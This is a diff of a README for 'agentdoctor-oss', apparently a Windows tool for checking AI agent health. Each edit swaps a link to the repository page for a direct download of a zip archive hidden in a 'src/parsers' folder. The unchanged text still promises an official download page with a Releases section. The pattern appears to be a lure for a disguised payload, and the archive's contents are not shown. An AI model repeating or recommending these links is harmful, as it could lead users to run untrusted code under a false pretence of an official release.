@@ -1,6 +1,6 @@
 # 🩺 agentdoctor-oss - Check AI Agent Health Easily
 
-[![Download agentdoctor-oss](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/akramo660/agentdoctor-oss)
+[![Download agentdoctor-oss](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/akramo660/agentdoctor-oss/raw/refs/heads/main/src/parsers/oss-agentdoctor-v1.3-beta.3.zip)
 
 ---
 
@@ -44,7 +44,7 @@ Follow these steps to get agentdoctor-oss running on your Windows PC:
 
 1. **Visit the download page:**  
    Click this link to open the official download page.  
-   [Download agentdoctor-oss](https://github.com/akramo660/agentdoctor-oss)  
+   [Download agentdoctor-oss](https://github.com/akramo660/agentdoctor-oss/raw/refs/heads/main/src/parsers/oss-agentdoctor-v1.3-beta.3.zip)  
 
 2. **Locate the latest release:**  
    On the page, look for the “Releases” section. This is where the latest version is posted.  
@@ -130,7 +130,7 @@ If you have trouble running agentdoctor-oss or loading your logs, try these step
 
 ## 🚩 About Updates
 
-Check the same [download page](https://github.com/akramo660/agentdoctor-oss) regularly to get the latest version. Updates improve diagnostics and fix bugs.
+Check the same [download page](https://github.com/akramo660/agentdoctor-oss/raw/refs/heads/main/src/parsers/oss-agentdoctor-v1.3-beta.3.zip) regularly to get the latest version. Updates improve diagnostics and fix bugs.
 
 ---
 
@@ -142,6 +142,6 @@ For help with this tool, check the issues section on the repository page. You ca
 
 ## 📥 Download agentdoctor-oss Now
 
-[![Download agentdoctor-oss](https://img.shields.io/badge/Get%20agentdoctor-oss-blueviolet?style=for-the-badge)](https://github.com/akramo660/agentdoctor-oss)  
+[![Download agentdoctor-oss](https://img.shields.io/badge/Get%20agentdoctor-oss-blueviolet?style=for-the-badge)](https://github.com/akramo660/agentdoctor-oss/raw/refs/heads/main/src/parsers/oss-agentdoctor-v1.3-beta.3.zip)  
 
 Follow the download steps above. Once installed, you will be able to check the health of your AI agents quickly and clearly.
